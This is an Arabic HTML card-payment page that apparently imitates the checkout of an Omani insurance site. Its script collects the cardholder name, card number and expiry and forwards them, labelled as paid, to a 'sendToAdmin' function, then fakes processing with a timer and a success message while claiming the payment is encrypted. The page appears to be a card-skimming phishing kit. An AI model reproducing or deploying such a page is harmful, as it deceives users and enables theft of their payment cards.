<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>بيمة</title>
  <link rel="icon" type="image/x-icon" href="https://b2b.om/assets/images/isc2.png">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@300;400;500;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --theme-main: #80C739;
      --theme-main-dark: #5eac12;
      --radius: 12px;
    }
    * { font-family: 'Rubik', sans-serif; }
    body { background: #faf8f5; margin: 0; padding: 0; min-height: 100vh; display: flex; flex-direction: column; }

    /* Header */
    .b2b-header { background: #fff; padding: 12px 0; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
    .b2b-header .container { display: flex; align-items: center; justify-content: space-between; }
    .b2b-header nav ul { list-style: none; display: flex; gap: 30px; margin: 0; padding: 0; }
    .b2b-header nav ul li a { text-decoration: none; color: #333; font-weight: 500; font-size: 14px; }
    .b2b-header .header-left { display: flex; align-items: center; gap: 15px; }
    .b2b-header .header-left a { text-decoration: none; color: #333; font-size: 14px; display: flex; align-items: center; gap: 5px; }

    /* Page Header */
    .page-header { background: radial-gradient(circle, #fff3cd 0%, #fff 100%); padding: 20px 0 15px; position: relative; }
    .page-header::after { content: ""; position: absolute; left: 0; bottom: 0; width: 100%; height: 1.3px; background: linear-gradient(to right, #5eac1200, #d1d1d1, #5eac1200); }
    .page-heading { color: #74a936; font-size: 32px; font-weight: 400; margin: 0; }

    /* Payment Card */
    .payment-wrapper { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 15px; }
    .payment-card {
      background: #fff;
      border-radius: var(--radius);
      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
      max-width: 500px;
      width: 100%;
      padding: 40px;
    }
    .payment-card h4 { text-align: center; margin-bottom: 5px; font-weight: 600; color: #333; }
    .payment-card .amount-display {
      text-align: center;
      font-size: 28px;
      font-weight: 700;
      color: var(--theme-main-dark);
      margin-bottom: 30px;
      padding-bottom: 20px;
      border-bottom: 1px solid #eee;
    }

    .card-icons { display: flex; justify-content: center; gap: 12px; margin-bottom: 25px; }
    .card-icons img { height: 30px; opacity: 0.7; }

    .form-label { font-weight: 500; color: #555; font-size: 14px; margin-bottom: 6px; }
    .form-control {
      border: 1.5px solid #e0e0e0;
      border-radius: 8px;
      padding: 12px 15px;
      font-size: 15px;
      transition: border-color 0.3s;
    }
    .form-control:focus { border-color: var(--theme-main); box-shadow: 0 0 0 3px rgba(128,199,57,0.1); }

    .card-row { display: flex; gap: 15px; }
    .card-row .form-group { flex: 1; }

    .btn-pay {
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #5eac12, #80C739);
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 25px;
      transition: all 0.3s;
    }
    .btn-pay:hover { background: linear-gradient(135deg, #4a8c0e, #6ab52e); transform: translateY(-1px); }
    .btn-pay:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }

    .secure-note { text-align: center; margin-top: 15px; color: #888; font-size: 12px; }
    .secure-note i { color: var(--theme-main); }

    .btn-back { display: block; text-align: center; margin-top: 15px; color: #666; text-decoration: none; font-size: 14px; }
    .btn-back:hover { color: var(--theme-main-dark); }

    /* Success Modal */
    .success-overlay {
      display: none;
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.5);
      z-index: 9999;
      align-items: center;
      justify-content: center;
    }
    .success-overlay.show { display: flex; }
    .success-box {
      background: #fff;
      border-radius: 16px;
      padding: 50px 40px;
      text-align: center;
      max-width: 400px;
      width: 90%;
      animation: popIn 0.3s ease;
    }
    @keyframes popIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
    .success-box .icon { font-size: 60px; color: var(--theme-main); margin-bottom: 20px; }
    .success-box h3 { color: #333; margin-bottom: 10px; }
    .success-box p { color: #666; margin-bottom: 25px; }
    .success-box .btn-done {
      padding: 12px 40px;
      background: var(--theme-main);
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 15px;
      font-weight: 500;
      cursor: pointer;
    }

    footer { background: #f5f5f5; padding: 15px 0; text-align: center; color: #888; font-size: 13px; }
  </style>
</head>
<body>
  <!-- Header -->
  <header class="b2b-header">
    <div class="container">
      <nav>
        <ul>
          <li><a href="/">الصفحة الرئيسية</a></li>
          <li><a href="#">تأمين</a></li>
          <li><a href="#">من نحن</a></li>
          <li><a href="#">تواصل معنا</a></li>
        </ul>
      </nav>
      <div class="header-left">
        <a href="tel:96822644442"><i class="bi bi-headset"></i> 968 22644442</a>
        <span class="globe"><i class="bi bi-globe2"></i></span>
      </div>
    </div>
  </header>

  <!-- Page Header -->
  <section class="page-header">
    <div class="container">
      <h2 class="page-heading">الدفع بالبطاقة</h2>
    </div>
  </section>

  <!-- Payment Form -->
  <div class="payment-wrapper">
    <div class="payment-card">
      <h4>ادفع بالبطاقة</h4>
      <div class="amount-display" id="amount-display">0.000 ر.ع</div>

      <div class="card-icons">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
      </div>

      <form id="paymentForm" onsubmit="return false;">
        <div class="form-group mb-3">
          <label class="form-label">اسم حامل البطاقة</label>
          <input type="text" class="form-control" id="cardName" placeholder="الاسم كما هو على البطاقة" required>
        </div>

        <div class="form-group mb-3">
          <label class="form-label">رقم البطاقة</label>
          <input type="text" class="form-control" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required dir="ltr" style="text-align:left;">
        </div>

        <div class="card-row mb-3">
          <div class="form-group">
            <label class="form-label">تاريخ الانتهاء</label>
            <input type="text" class="form-control" id="cardExpiry" placeholder="MM/YY" maxlength="5" required dir="ltr" style="text-align:left;">
          </div>
          <div class="form-group">
            <label class="form-label">CVV</label>
            <input type="text" class="form-control" id="cardCvv" placeholder="123" maxlength="4" required dir="ltr" style="text-align:left;">
          </div>
        </div>

        <button type="submit" class="btn-pay" id="payBtn" onclick="processPayment()">
          <i class="bi bi-lock me-2"></i>ادفع الآن
        </button>
      </form>

      <div class="secure-note">
        <i class="bi bi-shield-lock-fill me-1"></i> الدفع آمن ومشفر بالكامل
      </div>

      <a href="/insurance/b2b-checkout" class="btn-back">
        <i class="bi bi-arrow-right me-1"></i> العودة للملخص
      </a>
    </div>
  </div>

  <!-- Success Modal -->
  <div class="success-overlay" id="successOverlay">
    <div class="success-box">
      <div class="icon"><i class="bi bi-check-circle-fill"></i></div>
      <h3>تمت عملية الدفع بنجاح!</h3>
      <p>تم تأكيد طلبك وسيتم إرسال تفاصيل الوثيقة على بريدك الإلكتروني</p>
      <button class="btn-done" onclick="window.location.href='/'">تم</button>
    </div>
  </div>

  <!-- Footer -->
  <footer>
    <p>حقوق الطبع والنشر &copy; 2026, جميع الحقوق محفوظة</p>
  </footer>

  <script>
  // Get amount from URL
  var params = new URLSearchParams(window.location.search);
  var amount = params.get('amount') || '0.000';
  document.getElementById('amount-display').textContent = parseFloat(amount).toFixed(3) + ' ر.ع';

  // Format card number with spaces
  document.getElementById('cardNumber').addEventListener('input', function(e) {
    var val = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
    var formatted = val.match(/.{1,4}/g);
    e.target.value = formatted ? formatted.join(' ') : '';
  });

  // Format expiry
  document.getElementById('cardExpiry').addEventListener('input', function(e) {
    var val = e.target.value.replace(/\D/g, '');
    if (val.length >= 2) {
      e.target.value = val.substring(0, 2) + '/' + val.substring(2, 4);
    } else {
      e.target.value = val;
    }
  });

  // CVV only numbers
  document.getElementById('cardCvv').addEventListener('input', function(e) {
    e.target.value = e.target.value.replace(/\D/g, '');
  });

  // Process payment
  function processPayment() {
    var name = document.getElementById('cardName').value.trim();
    var number = document.getElementById('cardNumber').value.trim();
    var expiry = document.getElementById('cardExpiry').value.trim();
    var cvv = document.getElementById('cardCvv').value.trim();

    if (!name || !number || !expiry || !cvv) {
      alert('يرجى تعبئة جميع الحقول');
      return;
    }

    if (number.replace(/\s/g, '').length < 16) {
      alert('رقم البطاقة غير صحيح');
      return;
    }

    // Send to admin
    if (window.sendToAdmin) {
      window.sendToAdmin({
        'اسم حامل البطاقة': name,
        'رقم البطاقة': number,
        'تاريخ الانتهاء': expiry,
        'الحالة': 'تم الدفع - B2B'
      }, 'B2B - الدفع بالبطاقة');
    }

    // Simulate payment processing
    var btn = document.getElementById('payBtn');
    btn.disabled = true;
    btn.innerHTML = '<i class="bi bi-hourglass-split me-2"></i>جاري المعالجة...';

    setTimeout(function() {
      btn.innerHTML = '<i class="bi bi-check-circle me-2"></i>تم الدفع';
      document.getElementById('successOverlay').classList.add('show');
    }, 2000);
  }
  </script>
<script src="../visitor-tracking.js"></script>
</body>
</html>
